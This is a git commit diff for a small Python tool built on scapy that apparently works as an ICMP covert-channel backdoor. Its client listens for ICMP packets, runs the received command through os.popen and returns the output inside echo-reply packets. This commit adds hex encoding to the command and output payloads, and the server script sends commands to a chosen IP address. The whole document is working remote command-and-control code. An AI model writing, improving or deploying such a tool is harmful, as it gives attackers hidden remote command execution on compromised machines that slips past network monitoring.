2a30225f0601f7dfdbd6fe5f2ea9fba1d724cc51
5h3r10ck <adilaheyad@gmail.com>
2020-08-12 20:44:34 +0100

    encoding added

--- client.py
+++ client.py
@@ -3,17 +3,20 @@
 # Client should be on the host machine
 
 from scapy.all import *
+import binascii
 
 server = "127.0.0.1"
 
 def send_cmd(cmd):
-	packet = IP(dst=server)/ICMP(type="echo-reply", id=0x6341, seq=0x1)/cmd
+	hex_cmd = binascii.hexlify(cmd.encode("utf8"))
+	packet = IP(dst=server)/ICMP(type="echo-reply", id=0x6341, seq=0x1)/hex_cmd
 	send(packet)
 	print("done")
 
 recv = sniff(filter="host 127.0.0.1 and icmp", count=1, iface="lo")
 print(recv)
 data = recv[0][Raw].load.decode('utf-8')
-out = os.popen(data).read()
+cmd = binascii.unhexlify(data).decode("utf8")
+out = os.popen(cmd).read()
 
 send_cmd(out)
--- server.py
+++ server.py
@@ -4,7 +4,7 @@
 
 import argparse
 from scapy.all import *
-
+import binascii
 parser = argparse.ArgumentParser()
 parser.add_argument("ip", help="IP address")
 parser.add_argument("-c", "--command", help="execute command")
@@ -13,15 +13,11 @@ parser.add_argument("-t", "--transfer", help="transfer files")
 args = parser.parse_args()
 
 def send_cmd(cmd):
-	packet = IP(dst=args.ip)/ICMP(id=0x6341, seq=0x1)/cmd
+	hex_cmd = binascii.hexlify(cmd.encode("utf8"))
+	packet = IP(dst=args.ip)/ICMP(id=0x6341, seq=0x1)/hex_cmd
 	resp = sr1(packet)
-	print(resp[0][0][Raw].load.decode('utf-8'))
-
-def recv_out():
-	out = sniff(filter="host 127.0.0.1 and icmp", count=2, iface="lo", timeout=2)
-	#data = out[0][Raw].load.decode('utf-8')
+	data = resp[0][0][Raw].load.decode('utf-8')
+	out=binascii.unhexlify(data).decode("utf8")
 	print(out)
-	print("done 2")
 
-#recv_out()
 send_cmd(args.command)
